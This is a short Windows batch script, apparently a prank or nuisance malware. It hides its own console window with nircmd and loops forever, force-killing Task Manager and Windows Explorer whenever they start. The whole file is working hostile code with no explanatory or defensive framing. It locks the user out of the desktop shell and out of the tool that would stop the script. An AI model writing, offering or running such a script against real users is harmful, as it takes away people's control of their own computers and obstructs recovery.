@echo off
:loop
nircmd win hide title "kill.batC:\Windows\system32\cmd.exe"
tasklist /FI "IMAGENAME eq taskmgr.exe" 2>NUL | find /I /N "taskmgr.exe">NUL
if "%ERRORLEVEL%"=="0" taskkill /im taskmgr.exe /f
tasklist /FI "IMAGENAME eq explorer.exe" 2>NUL | find /I /N "explorer.exe">NUL
if "%ERRORLEVEL%"=="0" taskkill /im explorer.exe /f
goto loop